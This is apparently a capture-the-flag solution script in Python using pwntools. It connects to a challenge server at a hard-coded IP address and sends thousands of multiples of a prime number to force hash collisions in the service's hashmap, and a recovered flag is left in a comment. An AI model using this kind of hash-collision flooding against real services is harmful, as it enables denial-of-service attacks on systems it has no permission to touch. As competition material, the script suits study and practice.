from pwn import *

ip = "104.248.97.237"
# p = remote("localhost", 4001)
p = remote(ip, 1343)
lines = []
row = []
prime = 10273 
# prime = 20753
# 20753 also not bad
for i in range(1,10000):
    row.append(str(i*prime))
    if i % 10 == 0:
        lines.append('1')
        lines.append(' '.join(row))
        row.clear()
lines.append('2')
for str_line in lines:
    p.sendline(str_line.encode('utf-8'))
p.interactive()


# REP{wait_they_told_me_that_a_hashmapis_O(1)_c96b99e3bee4e7e924c66baa7cc50f1c}
